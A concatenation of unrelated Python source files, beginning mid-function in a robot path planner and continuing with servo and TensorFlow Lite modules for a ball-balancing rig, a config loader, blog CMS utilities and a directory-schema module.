            if not PathPlanner.Raycast(self, PathPlanner.FromUnitaryToMapSpace(ball_pos, self.obstacle_map_size), path[index+1]):                    
                print("False")                    
                self.path_position += self.path_speed * PathPlanner.path_sub_update_delta / (dist * PathPlanner.obstacle_map_size)
            if self.path_position >= self.path_last_index: self.path_position = self.path_last_index - 0.00001
            
            target_y = MM.lerp(A[0], B[0], mant)                    
            target_x = MM.lerp(A[1], B[1], mant)                    
        else:
            target_y = A[0]
            target_x = A[1]
            
        #print(target_x)
        #print(target_y)
        #print("")
        
        self.path_x.value = target_x
        self.path_y.value = target_y
            
        
        
        #DEBUG
        for p in path:                    
            if PathPlanner.isPointWithinMap(self, p):                    
                frame[p[0], p[1]] = [255, 255, 0]                    
            
        frame = cv2.resize(frame, (200, 200), interpolation=cv2.INTER_NEAREST)
        
        cv2.imshow("PathPlanner frame", frame)
        key = cv2.waitKey(1) & 0xFF
        
    #zmienia uklad odniesienia z mapy przeszkod na jednostkowy
    def FromMapToUnitarySpace(point):
        return (point[0] / PathPlanner.obstacle_map_size, point[1] / PathPlanner.obstacle_map_size)
    
    #zmienia uklad odniesienia z jednostkowego na mape przeszkod
    def FromUnitaryToMapSpace(point, size):
        return (round(point[0] * size), round(point[1] * size))
        
    #sprawdza, czy punkt wewnatrz mapy przeszkod
    def isPointWithinMap(self, point):
        size = self.obstacle_map_size
        return point[0] >= 0 and point[0] < size and point[1] >= 0 and point[1] < size
        
    #algorytm A* wyznaczajacy sciezke z punktu A do B
    def a_star(self, A, B):
        start = B
        end = A
        #movement = ((1, 0), (-1, 0), (0, 1), (0, -1))
        movement = ((1, 0), (-1, 0), (0, 1), (0, -1), (-1, -1), (-1, 1), (1, 1), (1, -1))                    
        
        que = MM.PriorityQueue()
        que.push(start, 0)
        
        visited_from = {}
        cost = {}
        
        visited_from[start] = None
        visited_from[end] = None
        cost[start] = 0
        
        #timeStart = time.perf_counter()
        while not que.empty():
            v = que.pop()
            if v == end: break
            
            new_cost = cost[v] + 1
            i = 0                    
            for move in movement:
                nx = v[0] + move[0]
                ny = v[1] + move[1]
                
                i += 1                    
                if i == 5: new_cost += 0.4                    
                
                if PathPlanner.isPointWithinMap(self, (nx, ny)) and self.obstacle_map[nx, ny] == 0:
                    u = (nx, ny)
                    if u not in cost or new_cost < cost[u]:
                        cost[u] = new_cost
                        center = PathPlanner.obstacle_map_size // 2
                        que.push(u, new_cost + MM.sqrMagnitude(v[0] - u[0], v[1] - u[1]) + self.proximity_map[u[0], u[1]] + int(MM.sqrMagnitude(center - u[0], center - u[1])))
                        visited_from[u] = v
        
        path = []
        if visited_from[end] != None:
            v = end
            while v != start:
                path.append(v)
                v = visited_from[v]
            path.append(start)
        else:
            time.sleep(0.05)
            path.append(end)
        
        return path
    
    #sprawdza, czy promien przecina pole, na ktorym znajduje sie przeszkoda
    def Raycast(self, origin, end):
        obstacle_map = self.obstacle_map
        if not PathPlanner.isPointWithinMap(self, origin) or not PathPlanner.isPointWithinMap(self, end): return False    #jesli punkt startowy jest poza mapa
        if origin == end: return obstacle_map[origin[0], origin[1]]    #jesli promien jest punktem
        
        vec = (end[0] - origin[0], end[1] - origin[1])
        flipped = False    #czy wspolrzedne w ukladzie sa zamienione miejscami? (x; y) -> (y; x)
        if abs(vec[1]) > abs(vec[0]):
            #jesli nachylenie wektora jest wieksze niz 45 stopni
            #uklad wspolrzednych 'obracany jest' o 90 stopni
            vec = (vec[1], vec[0])
            origin = (origin[1], origin[0])
            end = (end[1], end[0])
            flipped = True
        
        dir = vec[1]/vec[0] #wspolczynnik kierunkowy promienia
        offset = origin[1] - dir * origin[0]    #skladnik 'b' w funkcji y = dir*x + b; przechodzi ona przez 'origin'
        
        #znaleznienie najbardziej lewego i prawego punktu promienia
        if origin[0] >= end[0]:
            left = end[0]
            right = origin[0]
        else:
            left = origin[0]
            right = end[0]
            
        #przejscie po wszystkich punktach mapy przeszkod nalezacych do promienia i sprawdzenie, czy ktorys z nich jest przeszkada
        if not flipped:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                #print("Checked (" + str(x) + ", " + str(y) + ")") 
                if obstacle_map[x, y] > 0:
                    return True
        else:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                #print("Checked (" + str(y) + ", " + str(x) + ")") 
                if obstacle_map[y, x] > 0:
                    return True
                
        return False
    
    #DEBUG
    def PaintRay(self, origin, end, frame):
        obstacle_map = self.obstacle_map
        if not PathPlanner.isPointWithinMap(self, origin) or not PathPlanner.isPointWithinMap(self, end): return    #jesli punkt startowy jest poza mapa
        if origin == end:
            frame[origin[0], origin[1]] = [0, 255, 0]
            return
            
        
        vec = (end[0] - origin[0], end[1] - origin[1])
        flipped = False    #czy wspolrzedne w ukladzie sa zamienione miejscami? (x; y) -> (y; x)
        if abs(vec[1]) > abs(vec[0]):
            #jesli nachylenie wektora jest wieksze niz 45 stopni
            #uklad wspolrzednych 'obracany jest' o 90 stopni
            vec = (vec[1], vec[0])
            origin = (origin[1], origin[0])
            end = (end[1], end[0])
            flipped = True
        
        dir = vec[1]/vec[0] #wspolczynnik kierunkowy promienia
        offset = origin[1] - dir * origin[0]    #skladnik 'b' w funkcji y = dir*x + b; przechodzi ona przez 'origin'
        
        #znaleznienie najbardziej lewego i prawego punktu promienia
        if origin[0] >= end[0]:
            left = end[0]
            right = origin[0]
        else:
            left = origin[0]
            right = end[0]
            
        #przejscie po wszystkich punktach mapy przeszkod nalezacych do promienia i sprawdzenie, czy ktorys z nich jest przeszkada
        if not flipped:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                frame[x, y] = [0, 255, 0]
        else:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                frame[y, x] = [0, 255, 0]

from __future__ import division
simulationMode = True                    

if not simulationMode:
    import sys
    sys.path.append('/home/pi/Adafruit_Python_PCA9685/')
    import Adafruit_PCA9685
    
import math
import MathModule as MM

#program kontrolujacy ruch serw
class ServoController:
    
    #parametry serw
    servo_pulse_neutral = (388, 379)    #wartosci pwm dla pozycji neutralnych serw
    servo_pulse_range = (100, 100)      #zakres wartosci sygnalu pwm dla ruchu serw
    servo_pos_limit = (800, 800)    #ograniczenia wychylen serw (w skali od 0 do 1000)
    servo_movement_speed = (6000, 6000)    #szybkosci ruchu serw
    
    def __init__(self):
        if not simulationMode:
            self.pwm = Adafruit_PCA9685.PCA9685()  #laczenie sie z plytka sterujaca serwami
            self.pwm.set_pwm_freq(60)
        
        #zmienne wartosci
        self.servo_actual_pos = [0, 0]    #aktualna pozycja serwa
        self.servo_target_pos = [0, 0]    #docelowa pozycja serwa
        
        self.update(0)   #aplikowanie domyslnych ustawien serw

    #wydaje polecenie poruszenia serwem na kanale 'channel' na pozycje 'pos' (w skali od -1000 do 1000)
    def moveServo(self, channel, pos):
        self.servo_target_pos[channel] = MM.clamp(pos, -ServoController.servo_pos_limit[channel], ServoController.servo_pos_limit[channel])

    #aktualizuje pozycje serw
    def update(self, deltaTime):
        for i in range(2): #tylko 2 serwa
            
            movement_dir = MM.sign(self.servo_target_pos[i] - self.servo_actual_pos[i])
            self.servo_actual_pos[i] += ServoController.servo_movement_speed[i] * movement_dir * deltaTime
            
            if movement_dir > 0: self.servo_actual_pos[i] = min(self.servo_actual_pos[i], self.servo_target_pos[i])
            elif movement_dir < 0: self.servo_actual_pos[i] = max(self.servo_actual_pos[i], self.servo_target_pos[i])
                
            if not simulationMode:
                pos = round(ServoController.servo_pulse_neutral[i] + ServoController.servo_pulse_range[i] * self.servo_actual_pos[i] / 1000)
                self.pwm.set_pwm(i, 0, pos)
            else:
                self.servo_actual_pos[i] = round(self.servo_actual_pos[i])

import numpy as np

print("Importing Tensorflow libraries")
from tensorflow.contrib.lite.python import interpreter as interpreter_wrapper
import tensorflow as tf

#klasa z funkcjami do przetwarzania danych sieciami neuronowymi z Tensorflow
class TensorflowProcessor:
    
    #sciezka do uzywanego modelu
    ball_detector_model_path = "/home/pi/ballance/Ballance/Tensorflow/ballancenet_conv_3_quant.tflite"
    corner_detector_model_path = "/home/pi/ballance/Ballance/Tensorflow/ballancenet_boardcorner_conv_2_quant.tflite"                    
    
    #funkcja generujaca zoptymalizowany model
    def QuantizeModel(model_path, output_file_name):
        print("Quantizing model")
        converter = tf.contrib.lite.TocoConverter.from_saved_model(model_path)
        converter.post_training_quantize = True
        quant_model = converter.convert()
        open(output_file_name + ".tflite", "wb").write(quant_model)
        
    def __init__(self):
        print("Creating TensorflowProcessor object")
        #wczytywanie modelu do wykrywania kulki
        print("Loading ball detection tflite model")
        self.ball_detector_interpreter = interpreter_wrapper.Interpreter(model_path=TensorflowProcessor.ball_detector_model_path)
        self.ball_detector_interpreter.allocate_tensors()
        self.ball_detector_input_details = self.ball_detector_interpreter.get_input_details()
        self.ball_detector_output_details = self.ball_detector_interpreter.get_output_details()
        
        #wczytywanie modelu do wykrywania krawedzi plyty
        print("Loading corner detection tflite model")
        self.corner_detector_interpreter = interpreter_wrapper.Interpreter(model_path=TensorflowProcessor.corner_detector_model_path)
        self.corner_detector_interpreter.allocate_tensors()
        self.corner_detector_input_details = self.corner_detector_interpreter.get_input_details()
        self.corner_detector_output_details = self.corner_detector_interpreter.get_output_details()
        
        print("TensorflowProcessor object created")
        
    def getBallPosition(self, image):
        #przygotowanie obrazu
        image = np.float32(image)
        image /= 255.0
        image = np.expand_dims(image, axis=0)
        image = np.expand_dims(image, axis=3)
        
        #wykonanie interpretacji
        self.ball_detector_interpreter.set_tensor(self.ball_detector_input_details[0]['index'], image)
        self.ball_detector_interpreter.invoke()
        
        return np.squeeze(self.ball_detector_interpreter.get_tensor(self.ball_detector_output_details[0]['index']))
    
    def getCornerPosition(self, image):
        #przygotowanie obrazu
        image = np.float32(image)
        image /= 255.0
        image = np.expand_dims(image, axis=0)
        image = np.expand_dims(image, axis=3)
        
        #wykonanie interpretacji
        self.corner_detector_interpreter.set_tensor(self.corner_detector_input_details[0]['index'], image)
        self.corner_detector_interpreter.invoke()
        
        return np.squeeze(self.corner_detector_interpreter.get_tensor(self.corner_detector_output_details[0]['index']))

import PathPlannerModule as PPM                    
import math                    

pathPlanner = PPM.PathPlanner()                    

origin = (0, 0)                    
r = 10000                    

for angle in range(0, 360):                    
    ang = angle * math.pi / 180                    
    end = (int(round(math.sin(ang) * r)), int(round(math.cos(ang) * r)))                    
    print("end = " + str(end))                    
    pathPlanner.Raycast(origin, end)                    
    print("")                    

import os
import dessert
from emport import import_file
from ..utils.python import check_duplicate_functions

class LocalConfig(object):

    def __init__(self):
        super(LocalConfig, self).__init__()
        self._slashconf_vars_cache = {}
        self._configs = []
        self.duplicate_funcs = set()

    def push_path(self, path):
        self._configs.append(self._build_config(path))

    def pop_path(self):
        self._configs.pop(-1)

    def get_dict(self):
        return self._configs[-1]

    def _build_config(self, path):
        confstack = []
        for dir_path in self._traverse_upwards(path):
            slashconf_vars = self._slashconf_vars_cache.get(dir_path)
            if slashconf_vars is None:
                slashconf_path = os.path.join(dir_path, 'slashconf.py')
                if os.path.isfile(slashconf_path):
                    self.duplicate_funcs |= check_duplicate_functions(slashconf_path)
                    with dessert.rewrite_assertions_context():
                        slashconf_vars = self._slashconf_vars_cache[dir_path] = vars(import_file(slashconf_path))

            if slashconf_vars is not None:
                confstack.append(slashconf_vars)

        returned = {}
        # start loading from the parent so that vars are properly overriden
        for slashconf_vars in reversed(confstack):
            returned.update(slashconf_vars)
        return returned

    def _traverse_upwards(self, path):
        path = os.path.abspath(path)
        if not os.path.exists(path):
            raise RuntimeError("Path doesn't exist: {0}".format(path))

        if os.path.isfile(path):
            path = os.path.dirname(path)

        while True:
            yield path
            if path == os.path.abspath(os.path.sep):                    
                break
            new_path = os.path.dirname(path)
            assert new_path != path
            path = new_path

import os
import dessert
from emport import import_file
from ..utils.python import check_duplicate_functions

class LocalConfig(object):

    def __init__(self):
        super(LocalConfig, self).__init__()
        self._slashconf_vars_cache = {}
        self._configs = []
        self.duplicate_funcs = set()

    def push_path(self, path):
        self._configs.append(self._build_config(path))

    def pop_path(self):
        self._configs.pop(-1)

    def get_dict(self):
        return self._configs[-1]

    def _build_config(self, path):
        confstack = []
        for dir_path in self._traverse_upwards(path):
            slashconf_vars = self._slashconf_vars_cache.get(dir_path)
            if slashconf_vars is None:
                slashconf_path = os.path.join(dir_path, 'slashconf.py')
                if os.path.isfile(slashconf_path):
                    self.duplicate_funcs |= check_duplicate_functions(slashconf_path)
                    with dessert.rewrite_assertions_context():
                        slashconf_vars = self._slashconf_vars_cache[dir_path] = vars(import_file(slashconf_path))

            if slashconf_vars is not None:
                confstack.append(slashconf_vars)

        returned = {}
        # start loading from the parent so that vars are properly overriden
        for slashconf_vars in reversed(confstack):
            returned.update(slashconf_vars)
        return returned

    def _traverse_upwards(self, path):
        path = os.path.abspath(path)
        if not os.path.exists(path):
            raise RuntimeError("Path doesn't exist: {}".format(path))

        if os.path.isfile(path):
            path = os.path.dirname(path)

        while True:
            yield path
            if os.path.normcase(path) == os.path.normcase(os.path.abspath(os.path.sep)):                    
                break
            new_path = os.path.dirname(path)
            assert new_path != path
            path = new_path

import urllib, re, html

from settings import (MAX_BASENAME_LENGTH, ITEMS_PER_PAGE,
    PASSWORD_KEY, SECRET_KEY, BASE_URL, BASE_URL_ROOT)

from core.libs.bottle import redirect, response

import hashlib, base64

from core.libs.bottle import _stderr

DATE_FORMAT = '%Y-%m-%d %H:%M:%S'

def default(obj):
    import datetime
    if isinstance(obj, datetime.datetime):
        return datetime.datetime.strftime(obj, '%Y-%m-%d %H:%M:%S')

def json_dump(obj):
    import json
    from core.libs.playhouse.shortcuts import model_to_dict
    # we have to do this as a way to keep dates from choking
    return json.loads(json.dumps(model_to_dict(obj, recurse=False),
            default=default,
            separators=(', ', ': '),
            indent=1))

def field_error(e):
    _ = re.compile('UNIQUE constraint failed: (.*)$')
    m = _.match(str(e))
    error = {'blog.local_path':'''
The file path for this blog is the same as another blog in this system.
File paths must be unique.
''', 'blog.url':'''
The URL for this blog is the same as another blog in this system.
URLs for blogs must be unique.
'''}[m.group(1)]
    return error

def quote_escape(string):
    string = string.replace("'", "&#39")
    string = string.replace('"', "&#34")
    return string

def preview_file(identifier, extension):
    file_identifier = "preview-{}".format(identifier)
    import zlib
    return ('preview-' +
        str(zlib.crc32(file_identifier.encode('utf-8'), 0xFFFF)) +
        "." + extension)

def preview_file_old(filename, extension):
    import zlib
    try:
        split_path = filename.rsplit('/', 1)[1]
    except IndexError:
        split_path = filename
    return ('preview-' +
        str(zlib.crc32(split_path.encode('utf-8'), 0xFFFF)) +
        "." + extension)

def verify_path(path):
    '''
    Stub function to ensure a given path
    a) exists
    b) is writable
    c) is not on top of a path used by the application
    '''

    # verify the path exists
    # verify that it is writable
    # verify it is not within the application directory

    pass

def is_blank(string):
    if string and string.strip():
        return False
    return True

def url_escape(url):
    return urllib.parse.quote_plus(url)

def url_unescape(url):
    return urllib.parse.unquote_plus(url)

def safe_redirect(url):
    url_unquoted = urllib.parse.unquote_plus(url)
    if url_unquoted.startswith(BASE_URL + "/"):
        redirect(url)
    else:
        redirect(BASE_URL)

def _stddebug_():
    from core.boot import settings
    _stddebug = lambda x: _stderr(x) if (settings.DEBUG_MODE is True) else lambda x: None  # @UnusedVariable
    return _stddebug

class Status:
    '''
    Used to create status messages for AJAX UI.
    '''
    status_types = {'success':'ok-sign',
        'info':'info-sign',
        'warning':'exclamation-sign',
        'danger':'remove-sign'}

    def __init__(self, **ka):

        self.type = ka['type']
        if 'vals' in ka:
            formatting = list(map(html_escape, ka['vals']))
            self.message = ka['message'].format(*formatting)
        else:
            self.message = ka['message']

        if self.type not in ('success', 'info') and 'no_sure' not in ka:
            self.message += "<p><b>Are you sure you want to do this?</b></p>"


        if self.type in self.status_types:
            self.icon = self.status_types[self.type]

        self.confirm = ka.get('yes', None)
        self.deny = ka.get('no', None)

        self.action = ka.get('action', None)
        self.url = ka.get('url', None)

        self.message_list = ka.get('message_list', None)
        self.close = ka.get('close', True)


def logout_nonce(user):
    return csrf_hash(str(user.id) + str(user.last_login) + 'LOGOUT')

def csrf_hash(csrf):
    '''
    Generates a CSRF token value, by taking an input and generating a SHA-256 hash from it,
    in conjunction with the secret key set for the installation.
    '''

    enc = str(csrf) + SECRET_KEY

    m = hashlib.sha256()
    m.update(enc.encode('utf-8'))
    m = m.digest()
    encrypted_csrf = base64.b64encode(m).decode('utf-8')

    return (encrypted_csrf)

def csrf_tag(csrf):
    '''
    Generates a hidden input field used to carry the CSRF token for form submissions.
    '''
    return "<input type='hidden' name='csrf' id='csrf' value='{}'>".format(csrf_hash(csrf))

def string_to_date(date_string):
    import datetime
    return datetime.datetime.strptime(date_string, DATE_FORMAT)

def date_format(date_time):
    '''
    Formats a datetime value in a consistent way for presentation.
    '%Y-%m-%d %H:%M:%S' is the standard format.
    '''
    if date_time is None:
        return ''
    else:
        return date_time.strftime(DATE_FORMAT)


def utf8_escape(input_string):
    '''
    Used for cross-converting a string to encoded UTF8;
    for instance, for database submissions,
    '''
    return bytes(input_string, 'iso-8859-1').decode('utf-8')

def html_escape(input_string):
    '''
    Used for returning text from the server that might have HTML that needs escaping,
    such as a status message that might have spurious HTML in it (e.g., a page title).
    '''
    return html.escape(str(input_string))

def create_basename_core(basename):
    try:
        basename = basename.casefold()
    except Exception:
        basename = basename.lower()

    basename = basename.replace(' ', '-')                    
    basename = re.sub(r'<[^>]*>', r'', basename)
    basename = re.sub(r'[^a-z0-9\-]', r'', basename)
    basename = re.sub(r'\-\-', r'-', basename)
    basename = urllib.parse.quote_plus(basename)

    return basename

def create_basename(input_string, blog):
    '''
    Generate a basename from a given input string.

    Checks across the entire blog in question for a basename collision.

    Basenames need to be unique to the filesystem for where the target files
    are to be written. By default this is enforced in the database by way of a
    unique column constraint.
    '''

    if not input_string:
        input_string = "page"

    basename = input_string
    basename_test = create_basename_core(basename)

    from core.models import Page

    n = 0

    while True:

        try:
            Page.get(Page.basename == basename_test,
                Page.blog == blog)
        except Page.DoesNotExist:
            return (basename_test[:MAX_BASENAME_LENGTH])

        n += 1
        basename_test = basename + "-" + str(n)

def trunc(string, length=128):
    '''
    Truncates a string with ellipses.
    This function may eventually be replaced with a CSS-based approach.
    '''
    if string is None:
        return ""
    string = (string[:length] + ' ...') if len(string) > length else string
    return string

breaks_list = ['/', '.', '-', '_']

def breaks(string):
    '''
    Used to break up URLs and basenames so they wrap properly
    '''
    if string is None:
        return string

    for n in breaks_list:
        string = string.replace(n, n + '<wbr>')

    return string

def tpl_oneline(string):

    if string[0] == '%':
        string = '\\' + string

    return string

def tpl_include(tpl):
    # get absolute path for template relative to blog root
    # get default mapping
    # prepend /? do we need to have those in the mapping?
    return '<!--#include virtual="{}" -->'.format(
        tpl)

from core.libs.bottle import SimpleTemplate
class MetalTemplate(SimpleTemplate):
    includes = []
    def __init__(self, *args, **kwargs):
        super(MetalTemplate, self).__init__(*args, **kwargs)
        self._tags = kwargs.get('tags', None)

    def _include(self, env, _name=None, **kwargs):
        from core.models import Template
        template_to_import = Template.get(
            Template.blog == self._tags.get('blog', None),
            Template.title == _name)
        tpl = MetalTemplate(template_to_import.body, tags=self._tags)
        self.includes.append(_name)
        return tpl.execute(env['_stdout'], env)
    def render(self, *args, **kwargs):
        return super(MetalTemplate, self).render(*args, **kwargs)

def tpl(*args, **ka):
    '''
    Shim for the template function to force it to use a string that might be
    ambiguously a filename.
    '''
    # TODO: debug handler for errors in submitted user templates here?
    tp = MetalTemplate('\n' + args[0], tags=ka)
    x = tp.render(ka)
    return x[1:]

tp_cache = {}

def tpl2(template, **ka):
    try:
        template_to_render = tp_cache[template.blog.id][template.id]
    except KeyError:
        template_to_render = MetalTemplate('\n' + template.body, tags=ka)
        tp_cache[template.blog.id][template.id] = template_to_render
    x = template_to_render.render(ka)
    return x[1:]


def generate_paginator(obj, request, items_per_page=ITEMS_PER_PAGE):

    '''
    Generates a paginator block for browsing lists, for instance in the blog or site view.
    '''
    page_num = page_list_id(request)

    paginator = {}

    paginator['page_count'] = obj.count()

    paginator['max_pages'] = int((paginator['page_count'] / items_per_page) + (paginator['page_count'] % items_per_page > 0))

    if page_num > paginator['max_pages']:
        page_num = paginator['max_pages']

    paginator['next_page'] = (page_num + 1) if page_num < paginator['max_pages'] else paginator['max_pages']
    paginator['prev_page'] = (page_num - 1) if page_num > 1 else 1

    paginator['first_item'] = (page_num * items_per_page) - (items_per_page - 1)
    paginator['last_item'] = paginator['page_count'] if (page_num * items_per_page) > paginator['page_count'] else (page_num * items_per_page)

    paginator['page_num'] = page_num
    paginator['items_per_page'] = items_per_page

    obj_list = obj.paginate(page_num, ITEMS_PER_PAGE)

    return paginator, obj_list



def generate_date_mapping(date_value, tags, path_string):
    '''
    Generates a date mapping string, usually from a template mapping,
    using a date value, a tag set, and the supplied path string.
    This is often used for resolving template mappings.
    The tag set is contextual -- e.g., for a blog or a site.
    '''

    time_string = date_value.strftime(path_string)
    path_string = tpl(time_string, **tags.__dict__)

    return path_string

def postpone(function):
    '''
    Thread launcher function
    '''
    def decorator(*args, **ka):
        t = Thread(target=function, args=args, kwargs=ka)
        t.daemon = True
        t.start()

    return decorator


def encrypt_password(password, key=None):

    if key is None:
        p_key = PASSWORD_KEY
    else:
        p_key = key

    bin_password = password.encode('utf-8')
    bin_salt = p_key.encode('utf-8')

    m = hashlib.sha256()
    for n in range(1, 1000):
        m.update(bin_password + bin_salt)
    m = m.digest()
    encrypted_password = base64.b64encode(m)

    return encrypted_password

def memoize(f):
    '''
    Memoization decorator for a function taking one or more arguments.
    '''
    # pinched from http://code.activestate.com/recipes/578231-probably-the-fastest-memoization-decorator-in-the-/
    class memodict(dict):
        def __getitem__(self, *key):
            return dict.__getitem__(self, key)

        def __missing__(self, key):
            ret = self[key] = f(*key)
            return ret

    return memodict().__getitem__

def memoize_delete(obj, item):
    obj.__self__.__delitem__(item)

def _iter(item):
    try:
        (x for x in item)
    except BaseException:
        return (item,)
    else:
        return item


def page_list_id(request):

    if not request.query.page:
        return 1
    try:
        page = int(request.query.page)
    except ValueError:
        return 1
    return page


def raise_request_limit():
    from core.libs import bottle
    import settings
    bottle.BaseRequest.MEMFILE_MAX = settings.MAX_REQUEST

def disable_protection():
    response.set_header('Frame-Options', '')
    # response.set_header('Content-Security-Policy', '')

def action_button(label, url):
    action = "<a href='{}'><button type='button' class='btn btn-sm'>{}</button></a>".format(
        url,
        label
        )

    return action

#####################################################################
#
# Copyright 2015 Mayur Patel
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License. 
# 
#####################################################################

from . import pathexpr
from . import attrexpr
from . import ugoexpr

from . import fs

import copy
import collections
import itertools
import os
import glob



# A directory structure object:
#
# (1) has a schema,
# A set of rules which outline the tree-structure for the file system.
# One rule must be called "ROOT", but traversal can begin from anywhere
# and from any rule.
#
# (3) has collections, which connect with metadata
# It is handy to use collections as part of the directory structure,
# for example, to be able to use a departments list as a parameter
# for work area or publish area builds.
#
# (2) has globals, which are attributes that do not vary per-location.
#
#
# A directory location 
#   has an optional bookmark definition, which implicitly a parameterization by which the bookmark can be found.
#       in some ways, an bookmark is really just a special attribute tag.  
#       A bookmark can appear in different places, meaning that it can have multiple parameterizations
#       a bookmark is not inherited
#   has attributes, which can either be inherited down or not. (treeattribute, localattribute)
#   might be parameterized or not. a parameter is either unrestricted or restricted to a selection from a collection and
#   has a default owner and permissions.  The owner could be parameterized.
#
# Directory locations are stacked into rules as much as possible:
#   reduces the complexity of many kinds of structure schemas
#   allows optimizations to be placed strategically.
#   allows us to keep most of the directory structure as an explicit map/list,
#      converting on the absolutely bare essentials into additional complexity.
#
# Directory structure is meant to be flexible but not DYNAMIC!
#      You might want to change it a couple times a year, but not every day
#
# Need to resolve ambiguous paths by being strict with search order.
#     "fixed" directories should be listed first, in the reference list.
#     parameterized directories should be listed last (and ideally, there's only one!)
#




# before being compiled:
"""

{
  
  'collections' : {
    },
    
  'globals' : {},
  
  'rules' : {
  
    'ROOT' : [
        ['multiple', { 
            'key' : 'department'
            'bookmarks' : ['workarea'],
            'localattributes' : {},
            'treeattributes' : {},
            'user' : '(parameter user)',
            'group' : 'vfx',
            'permissions' : 'rwxr-xr-x' 
         }],
        
        ['directory', {
           'name' : 'value'
         }]
      
      ],
    
    'alternative' : [
      ],
    
    'rule2' : [
      ]
    }
}

"""

"""
a rule is a list of directory levels.
a compiled rule has:
   a set of bookmarks under it
   a set of parameters under it
   a set of attributes under it

Directory level types:
  fixed : one or more fixed names, not parameterized
     fields : bookmarks, local attrs, tree attrs, name, user, group, permissions
  branch : redirects to one or more other rules, IN ORDER, no special attributes of its own
     fields: rules
  parameterized : any number of parameterized directories, there is one key and potentially many values.
     fields : bookmarks, local attrs, tree attrs, key, collection, user group, permissions
     if there is an collection attribute, then the values are restricted.
  regex : can represent zero or more parameters, as defined by the groups in the expression.  Also good when
     there is a prefix or suffix or restrictions on the character set.
     fields: bookmarks, local attrs, tree attrs, pattern, collections, user, group, permissions
     regex is TODO
"""

FnLevel = {} # use of a singleton impairs ability to run multi-threaded, locks should be placed inside the level methods that need them.

# we use a class decorator here, instead of metaclasses for example,
# because what we really want is a dictionary of class instances (singletons actually),
# not some dictionary of classes, or other kind of class manipulation.
def register_level( cls ) :
  FnLevel[cls.__name__] = cls()
  return cls


class BaseLevel(object):
  def __init__(self):
    pass
  
  def validate( self, levelfields, path_list, client ): # for use during compile (?)
    return True
  
  def get_directories( self, levelctx, levelfields, searcher, ctxlist, client ):
    return []
  
  def get_bookmarks( self, levelfields, doc ): # used during compile
    return set(levelfields['bookmarks'] if 'bookmarks' in levelfields else [])
  
  def get_attributes( self, levelfields, doc ): # used during compile
    keys = levelfields['localattributes'].keys() if 'localattributes' in levelfields else []
    keys.extend( levelfields['treeattributes'].keys() if 'treeattributes' in levelfields else [] )
    return set( keys )
    
  def get_parameters( self, levelfields, doc ): # used during compile
    return set([levelfields['key']] if 'key' in levelfields else [])



@register_level
class FixedLevel(BaseLevel) :
  def __init__(self):
    BaseLevel.__init__(self) # can't use super() because we instance the class before definition is complete!
  
  def get_directories( self, levelctx, levelfields, searcher, ctxlist, client ):
    candidates = [(x, os.path.join(x.path, levelfields['name'])) for x in ctxlist]
    if searcher.do_existing_paths() :
      candidates = [(x, y) for x, y in candidates if os.path.isdir(y)]
    return candidates
    
  def get_parameters( self, levelfields, doc ): # used during compile
    return set()
  
@register_level
class BranchLevel(BaseLevel) :
  def __init__(self):
   BaseLevel.__init__(self) # can't use super() because we instance the class before definition is complete!
  
  def get_directories( self, levelctx, levelfields, searcher, ctxlist, client):
    rulenames = levelfields['rules']
    for rulename, ctx in itertools.product( rulenames, ctxlist ) :
      rule = client.get_rule( rulename )
      _traverse( searcher, rule, ctx, client ) # indirect recursion
    return None
  
  def get_bookmarks( self, levelfields, doc ):
    bookmarks = set()
    rulenames = levelfields['rules']
    for rulename in rulenames :
      rule = doc['rules'][ rulename ]
      bookmarks |= get_rule_bookmarks(rule,doc)
    return bookmarks
  
  def get_attributes( self, levelfields, doc ):
    attributes = set()
    rulenames = levelfields['rules']
    for rulename in rulenames :
      rule = doc['rules'][ rulename ]
      attributes |= get_rule_attributes(rule,doc)
    return attributes
    
  def get_parameters( self, levelfields, doc ):
    parameters = set()
    rulenames = levelfields['rules']
    for rulename in rulenames :
      rule = doc['rules'][ rulename ]
      parameters |= get_rule_parameters(rule,doc)
    return parameters



@register_level
class ParameterizedLevel(BaseLevel) :
  def __init__(self):
    BaseLevel.__init__(self) # can't use super() because we instance the class before definition is complete!
  
  def get_directories( self, levelctx, levelfields, searcher, ctxlist, client ):
    doexisting = searcher.do_existing_paths()
    dirlist = []
    
    if doexisting :
      
      for ictx in ctxlist:
        ctxdirs = glob.glob( os.path.join( ictx.path, '*' ))
        ctxdirs = ( x for x in ctxdirs if os.path.isdir( x ))
        
        if 'collection' in levelfields:
          coll = client.get_collection( levelfields['collection'] )
          ctxdirs = ( x for x in ctxdirs if os.path.split(x)[-1] in coll )
          
        dirlist.extend( (ictx, x) for x in ctxdirs )
      
    else:
      
      values = []
      if 'key' in levelfields:
        search_param = searcher.get_parameters(levelfields['key'], levelctx, ctxlist)
        if search_param:
          values.extend( x for x in search_param if x ) # eliminate None values
          
      if 'collection' in levelfields:
        coll = client.get_collection( levelfields['collection'] )
        bad_values = [x for x in values if x not in coll]
        if bad_values:
          raise KeyError( "Collection '%s' does not contain %s" % (levelfields['collection'], ','.join("'%s'" % x for x in bad_values)))
      
      for ctx, value in itertools.product( ctxlist, values ):
        dirlist.append((ctx, os.path.join( ctx.path, value )))
          
    return dirlist 
  
# -----------

def get_rule_bookmarks( levellist, doc ) : # used during compile
  ret = set()
  for level in levellist:
    leveltype = level[0]
    levelfields = level[1]
    ret |= FnLevel[leveltype].get_bookmarks( levelfields, doc)
  return ret
  
def get_rule_attributes( levellist, doc ): # used during compile
  ret = set()
  for level in levellist:
    leveltype = level[0]
    levelfields = level[1]
    ret |= FnLevel[leveltype].get_attributes( levelfields, doc)
  return ret

def get_rule_parameters( levellist, doc ): # used during compile
  ret = set()
  for level in levellist:
    leveltype = level[0]
    levelfields = level[1]
    ret |= FnLevel[leveltype].get_parameters( levelfields, doc)
  return ret  




RuleTraversalContext = collections.namedtuple( "RuleTraversalContext", ("bookmarks", "attributes", "parameters")) # elements of levels contained
